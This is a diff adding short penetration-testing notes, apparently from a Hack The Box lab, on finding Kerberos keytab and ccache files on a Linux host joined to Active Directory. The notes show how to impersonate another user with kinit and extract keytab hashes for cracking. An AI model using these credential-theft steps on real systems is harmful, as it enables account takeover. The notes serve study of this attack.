@@ -1,1 +1,54 @@
 When the Linux devices are commected to the DC 
+
+====================================================================================================================
+
+Verifying if the Linux device is integrated with AD. 
+
+    umarkhan@linux01:~$ realm list :- Will give details about Active Directory 
+    umarkhan@linux01:~$ ps -ef | grep -i "winbind\|sssd"
+
+====================================================================================================================
+
+Finding Kerberos Tickets in Linux
+
+umarkhan@linux01:~$ find / -name *keytab* -ls 2>/dev/null :- Will get the locations of keytab file
+umarkhan@linux01:~$ env | grep -i krb5
+
+Note :- When the user authenticates to the domain, a ccache file is created that stores the ticket information. This file in stored in environment variabke called "KRB5CCNAME". This file could normally saved in /tmp folder. 
+
+umarkhan@linux01:~$ env | grep -i krb5
+KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh
+
+umarkhan@linux01:~$ ls -la /tmp
+
+
+====================================================================================================================
+
+Now after getting the keytab details, we can try to exploit it by impersonate the user with tool called "kinit" 
+
+Listing keytab file information ( we can users from ls -la /tmp) 
+    umarkhan@linux01:~$ klist -k -t /opt/specialfiles/carlos.keytab 
+
+Now we can Impersonate user with keytab 
+Step 1) umarkhan@linux01:~$ klist {This is keytab of present user}
+Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
+Default principal: umarkhan@INLANEFREIGHT.HTB
+
+Valid starting     Expires            Service principal
+10/06/22 17:02:11  10/07/22 03:02:11  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
+
+Step 2) umarkhan@linux01:~$ kinit <username to escalate it to>@INLANEFREIGHT.HTB -k -t /opt/specialfiles/<username to escalate it to>.keytab
+
+Step 3) umarkhan@inlanefreight.htb@linux01:~$ klist {We would have escalated to user whom we wanted to impersonate}
+
+        
+====================================================================================================================
+
+We can extract the keytab with Python script. After this we can crack the password and login as that user. 
+
+umarkhan@linux01:~$ python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 
+
+
+
+
+
